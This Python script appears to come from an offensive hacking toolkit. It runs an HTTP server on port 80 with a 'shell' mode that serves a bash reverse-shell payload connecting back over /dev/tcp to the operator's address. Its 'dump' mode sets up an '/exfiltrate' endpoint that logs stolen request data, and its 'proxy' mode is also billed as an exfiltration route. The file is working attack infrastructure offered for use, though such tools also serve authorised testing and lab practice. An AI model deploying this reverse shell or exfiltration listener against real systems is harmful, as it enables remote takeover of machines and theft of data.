#!/usr/bin/env python

from hackingscripts import util
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import requests
import sys
import os
import ssl

class FileServerRequestHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_POST(self):
        self.do_GET()

    def onForward(self, target):
        queryStr = "" if "?" not in self.path else self.path[self.path.index("?")+1:]
        if queryStr:
            target += "?" if "?" not in target else "&"
            target += queryStr

        method = self.command
        res = requests.request(method, target)
        return res.content, res.status_code

    def do_GET(self):

        path = self.server.cleanPath(self.path)
        if path in self.server.routes:
            data, code = self.server.routes[path](self)
            self.send_response(code)
            self.end_headers()

            if data:
                self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

        if path in self.server.dumpRequests:
            contentLength = self.headers.get('Content-Length')
            body = None

            if contentLength and int(contentLength) > 0:
                body = self.rfile.read(int(contentLength))

            print("==========")
            print(str(self.headers).strip())
            if body:
                print()
                print(body)
            print("==========")

    def log_message(self, format, *args):
        if self.server.logRequests:
            super().log_message(format, *args)

class HttpFileServer(HTTPServer):
    def __init__(self, addr, port):
        super().__init__((addr, port), FileServerRequestHandler)
        self.logRequests = False
        self.routes = { }
        self.dumpRequests = []

    def cleanPath(self, path):

        if "?" in path:
            path = path[0:path.find("?")]

        if not path.startswith("/"):
            path = "/" + path

        return path.strip()

    def addFile(self, name, data):
        if isinstance(data, str):
            data = data.encode("UTF-8")

        # return 200 - OK and data
        self.addRoute(name, lambda req: (data, 200))

    def dumpRequest(self, name):
        self.dumpRequests.append(self.cleanPath(name))

    def addRoute(self, path, func):
        self.routes[self.cleanPath(path)] = func

    def forwardRequest(self, path, target):
        self.addRoute(path, lambda req: req.onForward(target))

    def enableLogging(self):
        self.logRequests = True

    def enableSSL(self, keyFile=None, certFile=None):
        if keyFile is None:
            print("Generating certificate…")
            os.system("openssl req -new -x509 -keyout private.key -out server.crt -days 365 -nodes")
            certFile = "server.crt"
            keyFile = "private.key"

        self.socket = ssl.wrap_socket(self.socket,
            server_side=True,
            certfile=certFile,
            keyfile=keyFile,
            ssl_version=ssl.PROTOCOL_TLS,
            cert_reqs=ssl.CERT_NONE)

        # try:
        #     ssl._create_default_https_context = ssl._create_unverified_context
        # except AttributeError:
        #     print("Legacy Python that doesn't verify HTTPS certificates by default")
        #     pass

    def startBackground(self):
        t = threading.Thread(target=self.serve_forever)
        t.start()
        return t

    def start(self):
        return self.serve_forever()

if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ["shell","dump","proxy"]:
        print("Usage: %s [shell,dump,proxy]" % sys.argv[0])
        exit(1)

    fileServer = HttpFileServer("0.0.0.0", 80)
    ipAddress = util.getAddress()

    if sys.argv[1] == "shell":
        listenPort = 4444 if len(sys.argv) < 3 else int(sys.argv[2])
        rev_shell = "bash -i >& /dev/tcp/%s/%d 0>&1" % (ipAddress, listenPort)
        fileServer.addFile("shell.sh", rev_shell)
        print("Reverse Shell URL: http://%s/shell.sh" % ipAddress)
    elif sys.argv[1] == "dump":
        fileServer.dumpRequest("/exfiltrate")
        print("Exfiltrate data using: http://%s/exfiltrate" % ipAddress)
    elif sys.argv[1] == "proxy":
        fileServer.forwardRequest("/proxy", "https://google.com")
        print("Exfiltrate data using: http://%s/proxy" % ipAddress)

    fileServer.start()
